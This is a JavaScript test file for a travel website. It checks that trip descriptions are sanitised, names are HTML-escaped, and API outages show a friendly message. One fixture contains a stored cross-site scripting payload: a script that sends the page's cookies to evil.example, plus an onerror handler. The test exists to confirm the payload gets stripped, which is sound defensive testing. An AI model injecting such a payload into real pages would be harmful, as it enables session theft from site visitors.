'use strict';
/**
 * Customer website: the travel page must be safe to render even if the
 * database already holds malicious HTML (for example, written before input
 * validation existed).
 */
const request = require('supertest');
const { buildTestApp } = require('../support/testApp');

const stubClient = (trips) => ({ list: async () => trips });

describe('GET /travel', () => {
    test('renders trips with descriptions run through the HTML allowlist', async () => {
        const { app } = buildTestApp({
            tripsClient: stubClient([{
                code: 'EVIL000001',
                name: 'Totally Normal Trip',
                image: 'reef1.jpg',
                description: '<p>Nice</p><script>fetch("https://evil.example?c="+document.cookie)</script><img src=x onerror=alert(1)>',
            }]),
        });

        const res = await request(app).get('/travel');
        expect(res.status).toBe(200);
        expect(res.text).toContain('Totally Normal Trip');
        expect(res.text).toContain('<p>Nice</p>');
        expect(res.text).not.toMatch(/<script>fetch|onerror/);
    });

    test('names are HTML-escaped', async () => {
        const { app } = buildTestApp({
            tripsClient: stubClient([{ code: 'X', name: '<b>bold</b>', image: 'reef1.jpg', description: 'x' }]),
        });
        const res = await request(app).get('/travel');
        expect(res.text).toContain('&lt;b&gt;bold&lt;/b&gt;');
    });

    test('shows a friendly message when the API is unavailable', async () => {
        const { app, logs } = buildTestApp({ tripsClient: { list: async () => { throw new Error('ECONNREFUSED'); } } });
        const res = await request(app).get('/travel');
        expect(res.status).toBe(200);
        expect(res.text).toContain('Trips are temporarily unavailable');
        expect(res.text).not.toContain('ECONNREFUSED');
        expect(logs).toContainEqual(expect.objectContaining({ event: 'site.trips_unavailable' }));
    });
});
